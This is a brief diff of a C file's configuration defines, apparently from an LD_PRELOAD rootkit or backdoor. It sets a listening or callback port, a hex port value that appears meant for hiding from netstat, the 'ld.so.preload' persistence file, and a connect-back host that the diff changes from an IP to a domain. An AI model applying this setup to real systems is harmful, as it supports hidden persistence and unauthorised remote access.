@@ -19,7 +19,7 @@
 #define PORT "5555" // port to listen on / connect to
 #define HEXPORT "15B3" // hex value reflected in netstat
 #define FILENAME "ld.so.preload"
-#define IP "10.20.30.40" // IP to connect to
+#define IP "www.google.com" // Domain or IP to connect to
 
 
 /* I KEEP FORGETING THIS :
